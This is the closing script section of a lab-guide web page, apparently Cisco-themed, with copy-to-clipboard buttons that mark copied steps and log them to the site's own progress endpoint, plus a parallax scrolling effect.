//        var ciscohl = $(event.target).parent().nextAll('.ciscohl').first();
//        console.log ( ciscohl[0].id );
//        var pod = urlParams["pod"];
//        var section = urlParams["section"];
//
//        $.ajax({
//	       //type: "GET",
//	       url: "/dash/collect/pod/1/basics/os/" + ciscohl[0].id
//	       // data:  "pod=" + pod + "&section=" + section + "&step=" + ciscohl[0].id
//        });
//        event.clipboardData.setData("text/plain", ciscohl.text());
//         // $(event.target).parent().next(".ciscohl").css("background","#e0ffcb url('/static/images/ok.png') no-repeat top left / 45px 45px")
//         $(event.target).parent().next(".ciscohl").css("background","#e0ffcb url('/static/images/ok.png') no-repeat bottom right / 45px 45px")
//    });
//
//    // Notify copy success and reset tooltip title
//    zeroClipboard.on('aftercopy', function () {
//        htmlBridge
//            .attr('title', 'Copied!')
//            .tooltip('fixTitle')
//            .tooltip('show')
//            .attr('title', 'Copy to clipboard')
//            .tooltip('fixTitle');
//
//    });
//});
//
//function findPos(obj) {
//    var curtop = 0;
//    if (obj.offsetParent) {
//        do {
//            curtop += obj.offsetTop;
//        } while (obj = obj.offsetParent);
//    return [curtop];
//    }
//}
//
//
//// Notify copy failure
//zeroClipboard.on('error', function () {
//    ZeroClipboard.destroy();
//    htmlBridge
//        .attr('title', 'Flash required')
//        .tooltip('fixTitle')
//        .tooltip('show');
//});
//

///////////////////////////////////////////////////////////////////////////////
// Start NEW COPY/PASTE Clipboard code.
///////////////////////////////////////////////////////////////////////////////

var clipboard = new Clipboard('.copybutton', {
    text: function(btn_object){
        var webcopy = $(btn_object).parent().nextAll('.ciscohl2').first();
        return webcopy[0].innerText + "\n\r";
    }
});
clipboard.on('success', function(e) {
    var webcopy = $(event.target).parent().nextAll('.ciscohl2').first();
    var pod = urlParams["pod"];
    var section = urlParams["section"];

    $.ajax({
        url: "/dash/collect/pod/1/basics/os/" + webcopy[0].id
    });
    $(event.target).parent().next(".ciscohl2").css("background","#e0ffcb url('/static/images/ok.png') no-repeat bottom right / 45px 45px")

    e.clearSelection();
});
///////////////////////////////////////////////////////////////////////////////
// End COPY/PASTE Clipboard code.
///////////////////////////////////////////////////////////////////////////////



$(document).ready(function(){
   // cache the window object
   $window = $(window);

    $('.selectpicker').selectpicker({
          style: 'btn-default',
          size: 12
      });






    // $('pre code').each(function(i, block) {
    //     hljs.highlightBlock(block);
    // });

   $('section[data-type="background"]').each(function(){
     // declare the variable to affect the defined data-type
     var $scroll = $(this);

      $(window).scroll(function() {
        // HTML5 proves useful for helping with creating JS functions!
        // also, negative value because we're scrolling upwards
        var yPos = -($window.scrollTop() / $scroll.data('speed'));

        // background position
        var coords = '50% '+ yPos + 'px';

        // move the background
        $scroll.css({ backgroundPosition: coords });
      }); // end window scroll
   });  // end section function
}); // close out script


</script>

<textarea readonly="" style="font-size: 12pt; border: 0px; padding: 0px; margin: 0px; position: absolute; left: -9999px; top: 0px;"></textarea></body></html>
